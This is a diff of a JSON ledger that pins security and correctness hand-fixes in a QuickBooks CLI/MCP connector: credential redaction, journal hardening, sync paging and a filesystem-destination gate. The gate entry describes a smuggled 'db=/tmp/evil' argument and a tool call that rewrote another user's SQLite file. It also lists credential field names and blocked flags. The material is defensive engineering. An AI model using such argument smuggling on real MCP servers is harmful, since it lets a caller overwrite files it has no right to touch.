+          "not_contains": "os.Exit("
+        },
+        {
+          "file": "cli/cmd/quickbooks-cli/main.go",
+          "contains": "credkit.Exit(code)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/cmd/quickbooks-mcp/main.go",
+          "contains": "credkit.Exit(mcpMain())",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/cmd/quickbooks-mcp/main.go",
+          "contains": "server.WithToolHandlerMiddleware(credkit.MCPTools)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/cmd/quickbooks-mcp/main.go",
+          "contains": "credkit.MCPIn(os.Stdin), credkit.MCPOut()",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/cmd/quickbooks-mcp/main.go",
+          "contains": "credkit.MCPHTTP",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/credsql/credsql.go",
+          "contains": "credkit.SQLDriver(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/store/store.go",
+          "contains": "sql.Open(credsql.Driver",
+          "min_count": 3,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/platform/migration.go",
+          "contains": "sql.Open(credsql.Driver",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/qbo_credkit_hold.go",
+          "contains": "var OutboundGuard = credkit.Transport",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "sendClient.Transport = cliutil.OutboundGuard(httpClient.Transport)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "cliutil.HoldCredential(\"minted:authorization\", authHeader)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/client/client.go",
+          "contains": "credkit.WriteFile(cacheFile+\".platform.json\", data, 0o600)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/deliver.go",
+          "contains": "credkit.Transport(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/feedback.go",
+          "contains": "credkit.Transport(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/probe.go",
+          "contains": "credkit.Transport(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/learn/journal.go",
+          "contains": "credkit.AppendFile(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/helpers.go",
+          "contains": "credkit.Terminal(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/mcp/cobratree/shellout.go",
+          "contains": "credkit.RunCommand(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/paths.go",
+          "contains": "func AtomicWriteCredentialFile(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/paths.go",
+          "contains": "return credkit.WriteFile(tmp.Name(), data, fileMode)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/config.go",
+          "contains": "cliutil.AtomicWriteCredentialFile(",
+          "min_count": 2,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/qbo_credkit_hold.go",
+          "contains": "func QBOHoldURL(raw string) {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/qbo_credkit_hold.go",
+          "contains": "func QBOHoldEnvInputs() {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/profile.go",
+          "contains": "credentialLikeRunProfileFlag(fl.Name) || qboWebhookTarget(fl.Name, fl.Value.String())",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/profile.go",
+          "contains": "qboProfileForDisplay(p)",
+          "min_count": 2,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/deliver.go",
+          "contains": "func (s DeliverSink) shown() string {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/root.go",
+          "contains": "flags.deliverSink.shown()",
+          "min_count": 2,
+          "code_only": true
+        },
+        {
+          "file": "cli/cmd/quickbooks-mcp/qbo_kit_classes_e2e_test.go",
+          "contains": "func TestQBOPlainLinkIsNotWithheld(",
+          "min_count": 1
+        },
+        {
+          "file": "cli/cmd/quickbooks-mcp/qbo_chokepoint_e2e_test.go",
+          "contains": "func TestQBOEveryCredentialSourceReachesNoOutput(",
+          "min_count": 1
+        },
+        {
+          "file": "cli/internal/cli/profile.go",
+          "contains": "return cliutil.QBOCredentialProfileFlag(name)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/credwire/declarations.go",
+          "contains": "cliutil.QBOHoldEnvInputs()",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/deliver.go",
+          "contains": "\"building webhook request: %w\", qboWithoutURL(err)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/feedback.go",
+          "contains": "\"building feedback request: %w\", qboWithoutURL(err)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/credwire/declarations.go",
+          "contains": "selectBaseURL(lastOf(configs), lastOf(homes))",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/credwire/declarations.go",
+          "contains": "StdinFlags:       []string{\"--stdin\"},",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/credwire/declarations.go",
+          "contains": "holdProfileStores()",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/credwire/declarations.go",
+          "contains": "{Source: \"*\", Allowed: []string{\"base_url\"}},",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/config/qbo_token_store.go",
+          "contains": "func SelectedBaseURL(configPath string) string {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/qbo_credkit_hold.go",
+          "contains": "func QBOHoldProfileStore(data []byte) {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/feedback.go",
+          "contains": "feedback --stdin cannot record a note",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/credwire/declarations.go",
+          "contains": "MCPArguments:     []string{\"auth_header\", \"access_token\", \"refresh_token\", \"id_token\", \"client_id\", \"client_secret\", \"authorization\", \"token\", \"password\", \"api_key\"},",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cliutil/qbo_credkit_hold.go",
+          "contains": "qboWalkJSON(data, func(flag, value string) {",
+          "min_count": 1,
+          "code_only": true
+        }
+      ]
+    },
+    {
+      "id": "journal-credential-hardening",
+      "class": "secret-persisted",
+      "status": "active",
+      "summary": "The learn journal keeps no typed text that could be a credential: the session override is hashed, argv_shape records only flag names the invoked command declares, a failed flag is a placeholder plus a hash, teach.log records counts rather than raw arguments, and every store of an operator-supplied name, label or operand goes through the credential kit, which refuses a held value.",
+      "why": "The press template stored QUICKBOOKS_LEARN_SESSION raw, and any token typed as a flag name, in argv_shape and failed_flag, with teach and playbook amend writing raw args to teach.log. Unheld, the credential reached those files; held, the kit refused the whole journal entry. Refusal of a held value at the stores is the kit's sink check (no connector-side helper), pinned here so a reprint cannot route a store around it.",
+      "spec_encode_followup": "Press template fix; the fleet tool for this class will not merge, so each connector carries it by hand until the press generates it.",
+      "asserts": [
+        {
+          "file": "cli/internal/learn/journal.go",
+          "contains": "func hashHarnessSession(v string) string {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/learn/journal.go",
+          "contains": "return \"o:\" + hashHarnessSession(v)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/learn/journal.go",
+          "not_contains": "journalSessionEnvVar)); v != \"\" {\n\t\treturn v\n"
+        },
+        {
+          "file": "cli/internal/learn/journal.go",
+          "contains": "const journalUndeclaredFlag = \"<undeclared>\"",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/learn/journal.go",
+          "contains": "func JournalArgvShape(args []string, isBoolFlag, isDeclared func(name string) bool) map[string]string {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/learn/journal.go",
+          "contains": "if tok == \"--\" {\n\t\t\tbreak\n\t\t}",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/learn/journal.go",
+          "contains": "if isDeclared == nil || !isDeclared(name) {\n\t\t\tshape[journalUndeclaredFlag] = journalClassRedacted",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/learn/journal.go",
+          "contains": "entry.FailedFlag = \"--\" + journalUndeclaredFlag + \":\" + hashHarnessSession(entry.FailedFlag)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/learn/journal.go",
+          "contains": "credkit.AppendFile(p, append(line, '\\n'), 0o600)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/root.go",
+          "contains": "lookupFlag := func(name string) *pflag.Flag {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/root.go",
+          "contains": "isDeclaredFlag := func(name string) bool {",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/root.go",
+          "contains": "learn.JournalArgvShape(os.Args[1:], isBoolFlag, isDeclaredFlag)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/root.go",
+          "not_contains": "learn.JournalArgvShape(os.Args[1:], isBoolFlag)"
+        },
+        {
+          "file": "cli/internal/cli/root.go",
+          "contains": "if commandTreeHasFlag(rootCmd, strings.TrimLeft(failedFlag, \"-\")) {\n\t\tfailedFlag = \"\"",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/teach.go",
+          "contains": "\"teach: missing --query (%d args, %d resources)\", len(args), len(resources)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/teach.go",
+          "not_contains": "args=%v"
+        },
+        {
+          "file": "cli/internal/cli/teach_playbook.go",
+          "contains": "\"playbook amend: missing --query (%d args)\", len(args)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/teach_playbook.go",
+          "not_contains": "args=%v"
+        },
+        {
+          "file": "cli/internal/cli/profile.go",
+          "contains": "credkit.WriteFile(tmp, data, 0o600)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/feedback.go",
+          "contains": "credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/platform/profile.go",
+          "contains": "credkit.WriteFile(tmpName, data, 0o600)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/learn/teach_log.go",
+          "contains": "credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/cli/teach.go",
+          "contains": "credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+          "min_count": 2,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/learn/journal_test.go",
+          "contains": "\"o:93da339544719ff4\"",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/learn/journal_test.go",
+          "contains": "func TestJournalFailedFlagIdentity(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/cmd/quickbooks-mcp/qbo_journal_hardening_e2e_test.go",
+          "contains": "func TestQBOJournalKeepsNoTypedCredential(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/cmd/quickbooks-mcp/qbo_journal_hardening_e2e_test.go",
+          "contains": "func TestQBOHeldCredentialIsRefusedAsAStoredName(",
+          "min_count": 1,
+          "code_only": true
+        },
+        {
+          "file": "cli/internal/learn/journal_test.go",
+          "contains": "func TestJournalFailedFlagRealOnSibling(",
+          "min_count": 1,
+          "code_only": true
+        }
+      ]
     }
-   ]
-  },
-  {
-   "id": "qbo-query-paging",
-   "summary": "sync pages QBO /query via in-query STARTPOSITION/MAXRESULTS until a short page; without it the mirror truncates at 1000 rows/entity",
-   "why": "resourceSupportsPagination() is false for every QBO entity, so the generic sync loop breaks after page 1 - capping each entity at one 1000-row page (QBO's MAXRESULTS hard cap). On a real book this silently truncated catastrophically: only the first 1000 rows of each entity, making ar-aging/ap-aging/dso/balances wrong (not just partial), and QBO returns rows oldest-first so recent invoices were missing entirely. Fix carries the next STARTPOSITION in the loop's `cursor`, sets hasMore from full-page detection (len(items) >= qboMaxResults), and exempts /query from the generic !resourceSupportsPagination and short-page breaks. Verified live against a production tenant: all 8 resources sync to their exact live count(*) across the full book.",
-   "status": "active",
-   "spec_encode_followup": "Same press change as qbo-query-injection: a QBO sync-hint that emits STARTPOSITION/MAXRESULTS paging by construction.",
-   "asserts": [
+  ],
+  "retired": [
     {
-     "file": "cli/internal/cli/sync.go",
-     "contains": "qboMaxResults",
-     "min_count": 2
+      "id": "mcp-filesystem-destination-gate",
+      "retired_at": "4.34.0",
+      "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
     },
     {
-     "file": "cli/internal/cli/sync.go",
-     "contains": "startposition %d maxresults %d",
-     "min_count": 1
+      "id": "mcp-argv-value-joined",
+      "retired_at": "4.34.0",
+      "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
     },
     {
-     "file": "cli/internal/cli/sync.go",
-     "contains": "path != \"/query\"",
-     "min_count": 2
+      "id": "interim-http-security-note-2026-10-22",
+      "retired_at": "4.34.0",
+      "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
+    },
+    {
+      "id": "mcp-file-flags-refused",
+      "retired_at": "4.34.0",
+      "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
     }
-   ]
-  },
-  {
-   "id": "qbo-queryresponse-envelope",
-   "summary": "page-item extraction unwraps QBO's two-level `{\"QueryResponse\":{\"<Entity>\":[...]}}` envelope",
-   "why": "QBO /query nests the result array one level deeper than the generic extractor handles: `QueryResponse` (object) then the PascalCase entity key (array). Without `QueryResponse` in dataEnvelopeKeys, extractPageItems cannot reach the entity array, returns 0 items, and sync falls through to single-object upsert of the whole envelope. Adding it lets the existing two-level unwrap + single-array-sibling logic pull the entity array correctly. Paired with qbo-query-injection; both are required for sync to store any rows.",
-   "status": "active",
-   "spec_encode_followup": "Same press change as qbo-query-injection: a QBO response-envelope hint so the generated extractor unwraps QueryResponse.<Entity> by construction.",
-   "asserts": [
-    {
-     "file": "cli/internal/cli/sync.go",
-     "contains": "\"QueryResponse\"",
-     "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "qbo-db-path-env",
-   "summary": "defaultDBPath honors QUICKBOOKS_DB_PATH so sandbox and production keep separate local mirrors",
-   "why": "The local SQLite mirror path was hardcoded to ~/.local/share/quickbooks-cli/data.db with no per-tenant separation. QBO entity IDs are per-company and collide across companies (sandbox Id \"58\" vs production Id \"58\"), so running both sandbox and production against one data.db corrupts aggregates after a mode switch. The Keychain wrapper sets QUICKBOOKS_DB_PATH per mode (.../sandbox/data.db vs .../production/data.db); this env override makes every command (sync, doctor, the aggregates) honor it.",
-   "status": "active",
-   "spec_encode_followup": "Press change: a generic <CLI>_DB_PATH env override on defaultDBPath would let any multi-tenant connector isolate mirrors without a hand-edit.",
-   "asserts": [
-    {
-     "file": "cli/internal/cli/helpers.go",
-     "contains": "QUICKBOOKS_DB_PATH",
-     "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "qbo-aging-snapshots-table",
-   "summary": "aging-delta creates its aging_snapshots table on demand; no store migration defines it",
-   "why": "aging_delta.go (a novel hand-authored command) reads and writes an aging_snapshots table, but nothing in the store migrations creates it. So every aging-delta run errored `no such table: aging_snapshots` on the read path (loadLatestAgingSnapshot treats only sql.ErrNoRows as a clean first-run; a missing table is a hard error) - the command was broken from first use. Fix adds ensureAgingSnapshotsTable (CREATE TABLE IF NOT EXISTS) called before the read, so a fresh or freshly reprinted DB self-heals. aging_delta.go is a novel file kept whole by regen-merge, so this survives a reprint; this entry is the cheap backstop the reprint-survival doc recommends for novel commands.",
-   "status": "active",
-   "spec_encode_followup": "Press change: novel commands that own a private table should declare it in the store migration set so it is created by construction.",
-   "asserts": [
-    {
-     "file": "cli/internal/cli/aging_delta.go",
-     "contains": "CREATE TABLE IF NOT EXISTS aging_snapshots",
-     "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "qbo-report-reports-api",
-   "summary": "report pnl + report balance-sheet pull QBO financial statements (P&L, Balance Sheet) from the Reports API, which the /query-based CLI cannot reach",
-   "why": "QuickBooks financial statements live behind the Reports API (/reports/ProfitAndLoss, /reports/BalanceSheet), not /query, so the generated CLI could not produce them. report.go is a novel hand-authored command group (report pnl, report balance-sheet; read-only) kept whole by regen-merge, but its registration in the generated root.go (rootCmd.AddCommand(newReportCmd(flags))) is a hand-edit a reprint would clobber. This entry records it so the command survives.",
-   "status": "active",
-   "spec_encode_followup": "Press change: encode the report command group in the QBO spec (or a novel-feature manifest) so root.go registers it by construction without a hand-edit.",
-   "asserts": [
-    {
-     "file": "cli/internal/cli/root.go",
-     "contains": "newReportCmd(flags)",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/cli/report.go",
-     "contains": "/reports/ProfitAndLoss",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/cli/report.go",
-     "contains": "/reports/BalanceSheet",
-     "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "doctor-verdict-tracks-reality",
-   "summary": "doctor probes a real GET endpoint with the real credential and refuses to dial a placeholder base_url, instead of calling any HTTP response 'reachable' and never checking the credential",
-   "why": "`doctor` is the command every SKILL, guide and docs page tells an operator to run to confirm the connector works, and it could not tell a working install from a broken one. It called any HTTP response to `GET /` \"reachable\" and rendered it green, so a base_url aimed at the vendor's web UI (where every API path 404s) and a token rejected with 401 on every call both produced an all-green report. On this connector family it also never probed the credential at all: it printed \"present, not verified\" and left the operator to guess. The mirror defect: a connector whose shipped base_url default is a placeholder dialled the placeholder host, and the DNS failure rendered as \"FAIL API: unreachable\" - telling a correctly-credentialled operator they were broken without naming the one variable that would fix it. Several placeholder hosts resolve through live wildcard DNS and answer real HTTP, so dialling one produced a confident green verdict against a stranger's server. Measured and gated by tools/maintainer/check_doctor_truth.py. See issue #282.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "cli/internal/cli/doctor_verdict.go",
-     "contains": "func doctorProbeCredentials("
-    },
-    {
-     "file": "cli/internal/cli/doctor_verdict.go",
-     "contains": "func doctorBaseURLIsPlaceholder("
-    },
-    {
-     "file": "cli/internal/cli/doctor.go",
-     "contains": "doctorIsInfoKey(k)"
-    },
-    {
-     "file": "cli/internal/cli/doctor.go",
-     "contains": "doctorBaseURLIsPlaceholder(cfg.BaseURL)"
-    },
-    {
-     "file": "cli/internal/cli/doctor.go",
-     "contains": "doctorProbeCredentials(cmd.Context()"
-    },
-    {
-     "file": "cli/internal/cli/doctor.go",
-     "not_contains": "present, not verified. Run `%s %s`"
-    },
-    {
-     "file": "cli/internal/cli/doctor.go",
-     "not_contains": "for _, v := range report {"
-    }
-   ]
-  },
-  {
-   "id": "install-credentials-declared-on-every-channel",
-   "summary": "every operator credential this connector reads is declared on all three install channels: manifest.json (.mcpb), server.json (MCP Registry) and mcp-install.md (manual install)",
-   "why": "Issue #282 ('three live-verified connectors prompt for the wrong credentials'). A connector is installed through THREE independent channels that each carry their own copy of the credential list: manifest.json server.mcp_config.env (what the .mcpb bundle hands Claude Desktop, which has no shell profile, no config.toml and no export - so an undeclared variable is a variable nobody is ever asked for), server.json environmentVariables (the MCP Registry publish channel), and mcp-install.md's copy-paste JSON blocks plus its remote launch line (the manual path, which never touches the bundle at all). The fleet-wide audit found 60 of 65 connectors under-declaring 122 operator-facing variables in the manifest, 61 of 65 mcp-install.md pages omitting 125, and hudu's server.json missing the base URL its manifest marks required. For quickbooks the manifest gained: QUICKBOOKS_BASE_URL, QUICKBOOKS_CLIENT_ID, QUICKBOOKS_CLIENT_SECRET, QUICKBOOKS_ENVIRONMENT, QUICKBOOKS_REALM_ID, QUICKBOOKS_REFRESH_TOKEN, QUICKBOOKS_TOKEN_URL. server.json gained: QUICKBOOKS_BASE_URL, QUICKBOOKS_CLIENT_ID, QUICKBOOKS_CLIENT_SECRET, QUICKBOOKS_ENVIRONMENT, QUICKBOOKS_REALM_ID, QUICKBOOKS_REFRESH_TOKEN, QUICKBOOKS_TOKEN_URL. mcp-install.md's env blocks gained: QUICKBOOKS_BASE_URL, QUICKBOOKS_CLIENT_ID, QUICKBOOKS_CLIENT_SECRET, QUICKBOOKS_ENVIRONMENT, QUICKBOOKS_REALM_ID, QUICKBOOKS_REFRESH_TOKEN, QUICKBOOKS_TOKEN_URL. manifest.json, server.json and mcp-install.md are ALL regenerated by /msp-skills-publish on an UPDATE or re-onboard, so without this ledger a regeneration silently drops every declaration and CI stays green (check_env_schema.py is wired --warn). The asserts below name the specific credentials, not a count, so dropping one and adding another cannot cancel out.",
-   "status": "active",
-   "spec_encode_followup": "cli-printing-press should emit server.mcp_config.env, the matching user_config prompts, server.json environmentVariables and mcp-install.md's env blocks from ONE declaration of the connector's operator-facing environment, so the three channels cannot be generated out of step. Until then check_env_schema.py compares all three and this ledger pins them.",
-   "asserts": [
-    {
-     "file": "manifest.json",
-     "contains": "\"QUICKBOOKS_ACCESS_TOKEN\": \"${user_config.quickbooks_access_token}\"",
-     "min_count": 1
-    },
-    {
-     "file": "manifest.json",
-     "contains": "\"QUICKBOOKS_BASE_URL\": \"${user_config.quickbooks_base_url}\"",
-     "min_count": 1
-    },
-    {
-     "file": "manifest.json",
-     "contains": "\"QUICKBOOKS_CLIENT_ID\": \"${user_config.quickbooks_client_id}\"",
-     "min_count": 1
-    },
-    {
-     "file": "manifest.json",
-     "contains": "\"QUICKBOOKS_CLIENT_SECRET\": \"${user_config.quickbooks_client_secret}\"",
-     "min_count": 1
-    },
-    {
-     "file": "manifest.json",
-     "contains": "\"QUICKBOOKS_ENVIRONMENT\": \"${user_config.quickbooks_environment}\"",
-     "min_count": 1
-    },
-    {
-     "file": "manifest.json",
-     "contains": "\"QUICKBOOKS_REALM_ID\": \"${user_config.quickbooks_realm_id}\"",
-     "min_count": 1
-    },
-    {
-     "file": "manifest.json",
-     "contains": "\"QUICKBOOKS_REFRESH_TOKEN\": \"${user_config.quickbooks_refresh_token}\"",
-     "min_count": 1
-    },
-    {
-     "file": "manifest.json",
-     "contains": "\"QUICKBOOKS_TOKEN_URL\": \"${user_config.quickbooks_token_url}\"",
-     "min_count": 1
-    },
-    {
-     "file": "server.json",
-     "contains": "\"name\": \"QUICKBOOKS_ACCESS_TOKEN\"",
-     "min_count": 1
-    },
-    {
-     "file": "server.json",
-     "contains": "\"name\": \"QUICKBOOKS_BASE_URL\"",
-     "min_count": 1
-    },
-    {
-     "file": "server.json",
-     "contains": "\"name\": \"QUICKBOOKS_CLIENT_ID\"",
-     "min_count": 1
-    },
-    {
-     "file": "server.json",
-     "contains": "\"name\": \"QUICKBOOKS_CLIENT_SECRET\"",
-     "min_count": 1
-    },
-    {
-     "file": "server.json",
-     "contains": "\"name\": \"QUICKBOOKS_ENVIRONMENT\"",
-     "min_count": 1
-    },
-    {
-     "file": "server.json",
-     "contains": "\"name\": \"QUICKBOOKS_REALM_ID\"",
-     "min_count": 1
-    },
-    {
-     "file": "server.json",
-     "contains": "\"name\": \"QUICKBOOKS_REFRESH_TOKEN\"",
-     "min_count": 1
-    },
-    {
-     "file": "server.json",
-     "contains": "\"name\": \"QUICKBOOKS_TOKEN_URL\"",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "\"QUICKBOOKS_ACCESS_TOKEN\":",
-     "min_count": 3
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "\"QUICKBOOKS_BASE_URL\":",
-     "min_count": 3
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "\"QUICKBOOKS_CLIENT_ID\":",
-     "min_count": 3
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "\"QUICKBOOKS_CLIENT_SECRET\":",
-     "min_count": 3
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "\"QUICKBOOKS_ENVIRONMENT\":",
-     "min_count": 3
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "\"QUICKBOOKS_REALM_ID\":",
-     "min_count": 3
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "\"QUICKBOOKS_REFRESH_TOKEN\":",
-     "min_count": 3
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "\"QUICKBOOKS_TOKEN_URL\":",
-     "min_count": 3
-    }
-   ]
-  },
-  {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "novel-acceptance-fixtures-relative-to-today",
